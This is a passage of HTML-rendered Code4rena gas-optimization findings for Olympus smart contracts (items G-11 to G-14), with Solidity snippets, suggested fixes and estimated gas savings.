class=\"mtk7\">131</span><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getModuleAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Keycode</span><span class=\"mtk1\"> </span><span class=\"mtk12\">keycode_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">132</span><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">moduleForKeycode</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">kernel</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getModuleForKeycode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">keycode_</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">133</span><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">moduleForKeycode</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Policy_ModuleDoesNotExist</span><span class=\"mtk1\">(</span><span class=\"mtk12\">keycode_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">134</span><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">moduleForKeycode</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">135</span><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>fix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"108\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getModuleAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Keycode</span><span class=\"mtk1\"> </span><span class=\"mtk12\">keycode_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">moduleForKeycode</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">moduleForKeycode</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">kernel</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getModuleForKeycode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">keycode_</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">moduleForKeycode</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Policy_ModuleDoesNotExist</span><span class=\"mtk1\">(</span><span class=\"mtk12\">keycode_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<ul>\n<li>src/modules/INSTR.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L41-L79\">41-79</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"109\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Store a list of Instructions to be executed in the future.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">store</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Instruction</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">instructions_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">permissioned</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">43</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">length</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">instructions_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">44</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">instructionsId</span><span class=\"mtk1\"> = ++</span><span class=\"mtk12\">totalInstructions</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">45</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span><span class=\"mtk1\">        </span><span class=\"mtk12\">Instruction</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">instructions</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">storedInstructions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">instructionsId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">76</span><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InstructionsStored</span><span class=\"mtk1\">(</span><span class=\"mtk12\">instructionsId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">77</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">instructionsId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">79</span><span class=\"mtk1\">    }</span></span></span></code></pre>\n<ul>\n<li>src/modules/PRICE.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L153-L180\">153-180</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"110\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">153</span><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Get the current price of OHM in the Reserve asset from the price feeds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">154</span><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getCurrentPrice</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">177</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">ohmEthPrice</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_scaleFactor</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">reserveEthPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">178</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h2 id=\"g-11-x--x--y-is-cheaper-than-x--y-6-instances\" style=\"position:relative;\"><a href=\"#g-11-x--x--y-is-cheaper-than-x--y-6-instances\" aria-label=\"g 11 x  x  y is cheaper than x  y 6 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-11] <code>x = x + y</code> is cheaper than <code>x += y;</code> (6 instances)</h2>\n<p>Deployment Gas Saved: <strong>5 000</strong></p>\n<p>Usually does not work with struct and mappings.</p>\n<ul>\n<li>src/modules/PRICE.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L136\">136</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L138\">138</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L222\">222</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"111\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">            </span><span class=\"mtk12\">_movingAverage</span><span class=\"mtk1\"> += (</span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">earliestPrice</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">numObs</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">            </span><span class=\"mtk12\">_movingAverage</span><span class=\"mtk1\"> -= (</span><span class=\"mtk12\">earliestPrice</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">numObs</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">222</span><span class=\"mtk1\">            </span><span class=\"mtk12\">total</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">startObservations_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<ul>\n<li>src/modules/VOTES.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L56\">56</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L58\">58</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"112\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">56</span><span class=\"mtk1\">        </span><span class=\"mtk12\">balanceOf</span><span class=\"mtk1\">[</span><span class=\"mtk12\">from_</span><span class=\"mtk1\">] -= </span><span class=\"mtk12\">amount_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">            </span><span class=\"mtk12\">balanceOf</span><span class=\"mtk1\">[</span><span class=\"mtk12\">to_</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">amount_</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<ul>\n<li>src/policies/Heart.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L103\">103</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"113\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">103</span><span class=\"mtk1\">        </span><span class=\"mtk12\">lastBeat</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">frequency</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<h2 id=\"g-12-deleting-a-struct-is-cheaper-than-creating-a-new-struct-with-null-values-1-instances\" style=\"position:relative;\"><a href=\"#g-12-deleting-a-struct-is-cheaper-than-creating-a-new-struct-with-null-values-1-instances\" aria-label=\"g 12 deleting a struct is cheaper than creating a new struct with null values 1 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-12] Deleting a struct is cheaper than creating a new struct with null values. (1 instances)</h2>\n<p>Deployment Gas Saved: <strong>4 207</strong><br>\nMethod Call Gas Saved: <strong>40</strong><br></p>\n<ul>\n<li>src/policies/Governance.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L288\">288</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"114\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">288</span><span class=\"mtk1\">        </span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ActivatedProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>fix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"115\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"g-13-dont-compare-boolean-expressions-to-boolean-literals-2-instances\" style=\"position:relative;\"><a href=\"#g-13-dont-compare-boolean-expressions-to-boolean-literals-2-instances\" aria-label=\"g 13 dont compare boolean expressions to boolean literals 2 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-13] Don’t compare boolean expressions to boolean literals (2 instances)</h2>\n<p>Deployment Gas Saved: <strong>1 607</strong></p>\n<ul>\n<li>src/policies/Governance.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L223\">223</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L306\">306</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"116\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">223</span><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposalHasBeenActivated</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">] == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">306</span><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">tokenClaimsForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<h2 id=\"g-14-revert-operator-should-be-in-the-code-as-early-as-reasonably-possible-3-instances\" style=\"position:relative;\"><a href=\"#g-14-revert-operator-should-be-in-the-code-as-early-as-reasonably-possible-3-instances\" aria-label=\"g 14 revert operator should be in the code as early as reasonably possible 3 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-14] <code>revert</code> operator should be in the code as early as reasonably possible (3 instances)</h2>\n<p>Deployment Gas Saved: <strong>200</strong><br>\nMethod Call Gas Saved: <strong>1 559+</strong><br></p>\n<ul>\n<li>src/modules/INSTR.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L43-L48\">43-48</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"117\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">43</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">length</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">instructions_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">44</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">instructionsId</span><span class=\"mtk1\"> = ++</span><span class=\"mtk12\">totalInstructions</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">45</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span><span class=\"mtk1\">        </span><span class=\"mtk12\">Instruction</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">instructions</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">storedInstructions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">instructionsId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">47</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">INSTR_InstructionsCannotBeEmpty</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// @note after 43</span></span></span></code></pre>\n<ul>\n<li>src/policies/Governance.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L180-L191\">180-191</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L241-L249\">241-249</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"118\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">endorseProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @note put after revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">184</span><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CannotEndorseNullProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">186</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">187</span><span class=\"mtk1\">        </span><span class=\"mtk12\">Instruction</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">instructions</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">INSTR</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getInstructions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">188</span><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">instructions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">189</span><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CannotEndorseInvalidProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">190</span><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">191</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"119\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">241</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @note put after revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">242</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">243</span><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">244</span><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NoActiveProposalDetected</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">245</span><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">246</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">247</span><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">userVotesForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">248</span><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">UserAlreadyVoted</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">249</span><span class=\"mtk1\">        }</span></span></span></code></pre>\n<h2 id=\"g-15-duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function\" 